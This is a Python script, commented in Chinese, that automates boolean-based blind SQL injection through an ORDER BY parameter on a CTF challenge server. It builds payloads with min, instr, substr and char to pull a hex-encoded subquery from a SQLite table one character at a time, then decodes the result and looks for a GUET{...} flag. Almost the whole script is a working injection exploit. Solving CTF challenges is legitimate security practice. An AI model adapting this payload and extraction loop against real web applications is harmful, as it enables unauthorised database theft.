#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
GUET CTF - SQLite ORDER BY 布尔盲注自动化脚本
用法: python sqli_blind.py
"""

import requests
import time
import sys

# ============ 配置 ============
BASE_URL = "http://ctf.guetsec.cn:30030/?action=api&order="
TARGET_SUBQUERY = "(SELECT hex(group_concat(name)) FROM files)"  # 要提取的数据
MAX_LEN = 500          # 最大提取长度（hex 字符数）
DELAY = 0.1            # 每次请求间隔（秒），太快可能被封
# ============================


def test_condition(expr: str) -> bool | None:
    """
    发送一个注入表达式，判断条件是否为真。
    返回 True  = 条件为真（排序反转，Apple 排第一）
    返回 False = 条件为假（排序正常，Zebra 排第一）
    返回 None  = 请求出错
    """
    url = BASE_URL + requests.utils.quote(expr, safe='')
    try:
        resp = requests.get(url, timeout=10)
        data = resp.json()

        if "error" in data:
            return None

        # 第一条记录 id=2 → Apple 在前 → 排序反转 → 条件为真
        if data["data"][0]["id"] == 2:
            return True
        else:
            return False

    except Exception as e:
        print(f"\n[!] 请求出错: {e}")
        return None


def extract_hex_char(pos: int) -> str | None:
    """
    提取目标 hex 字符串的第 pos 个字符（从 1 开始）。
    遍历 0-9, A-F，找到匹配的那个。
    返回字符（'0'~'F'），如果该位置无字符则返回 None。
    """
    hex_chars = "0123456789ABCDEF"

    for c in hex_chars:
        ascii_val = ord(c)  # 字符的 ASCII 码

        # 构造完整的注入表达式
        # min(instr(name,char(90)), instr(substr(目标hex, pos, 1), char(猜的ASCII)))
        expr = (
            f"min(instr(name,char(90)),"
            f"instr(substr({TARGET_SUBQUERY},{pos},1),char({ascii_val})))"
        )

        result = test_condition(expr)
        time.sleep(DELAY)

        if result is True:
            return c

    # 16 个字符都没匹配到 → 到头了
    return None


def hex_to_string(hex_str: str) -> str:
    """把 hex 字符串转成普通字符串"""
    result = ""
    for i in range(0, len(hex_str), 2):
        byte = int(hex_str[i:i+2], 16)
        result += chr(byte)
    return result


def main():
    print("=" * 60)
    print("  GUET CTF - SQLite 布尔盲注自动化")
    print("=" * 60)
    print(f"目标子查询: {TARGET_SUBQUERY}")
    print(f"最大长度: {MAX_LEN} hex 字符")
    print()
    print("开始提取...")
    print()

    hex_result = ""

    for pos in range(1, MAX_LEN + 1):
        c = extract_hex_char(pos)

        if c is None:
            print(f"\n\n[√] 提取完成！共 {pos - 1} 个 hex 字符")
            break

        hex_result += c
        print(c, end="", flush=True)  # 实时打印，不换行
    else:
        print(f"\n\n[!] 达到最大长度 {MAX_LEN}，停止提取")

    print()
    print("-" * 60)
    print(f"Hex 结果: {hex_result}")
    print("-" * 60)

    if len(hex_result) % 2 == 0 and len(hex_result) > 0:
        plain = hex_to_string(hex_result)
        print(f"解码结果: {plain}")
        print()

        # 尝试找 flag
        if "GUET{" in plain:
            flag_start = plain.find("GUET{")
            flag_end = plain.find("}", flag_start)
            if flag_end != -1:
                flag = plain[flag_start:flag_end+1]
                print("=" * 60)
                print(f"  FLAG: {flag}")
                print("=" * 60)
    else:
        print("[!] hex 长度不是偶数，可能提取不完整")


if __name__ == "__main__":
    main()
